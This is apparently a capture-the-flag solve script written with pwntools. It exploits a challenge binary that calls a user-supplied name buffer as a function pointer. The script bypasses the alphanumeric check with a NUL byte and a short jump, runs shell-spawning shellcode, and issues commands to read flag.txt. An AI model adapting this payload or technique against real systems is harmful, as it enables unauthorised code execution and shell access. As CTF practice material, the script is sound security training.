#!/usr/bin/env python3
from pwn import *
import re

context.binary = ELF("./vuln", checksec=False)
context.arch = "amd64"

HOST = args.HOST or "chal.bearcatctf.io"
PORT = int(args.PORT or 40385)


def build_payload() -> bytes:
    # Option 3 calls our name buffer as a function pointer.
    # strlen() is used for validation, so a NUL byte ends the alnum check.
    # Prefix (all alnum): xor al, 'A'; jnz +0x30 to skip into unchecked bytes.
    jump_target = 52
    stub = b"4Au0" + b"BBBB" + b"\x00"
    shellcode = asm(shellcraft.sh())
    payload = stub + b"C" * (jump_target - len(stub)) + shellcode

    assert len(payload) <= 0x95
    assert all(chr(b).isalnum() for b in payload.split(b"\x00", 1)[0])
    return payload


def solve(io):
    io.recvuntil(b"4. Jump off the boat\n")
    io.sendline(b"3")
    io.recvuntil(b"What is your name? ")
    io.send(build_payload())

    io.sendline(
        b"echo __BEGIN__; id; pwd; ls -la; cat flag.txt; echo __END__;"
    )
    out = io.recvrepeat(1.5)
    print(out.decode("latin1", errors="ignore"))

    m = re.search(rb"BCCTF\{[^}\n]+\}", out)
    if m:
        log.success(f"flag = {m.group().decode()}")
    else:
        log.warning("Flag not found in output. Dropping to interactive shell.")
        io.interactive()


def main():
    if args.LOCAL:
        io = process("./vuln", stdin=PIPE, stdout=PIPE, stderr=PIPE)
    else:
        io = remote(HOST, PORT)
    solve(io)
    io.close()


if __name__ == "__main__":
    main()
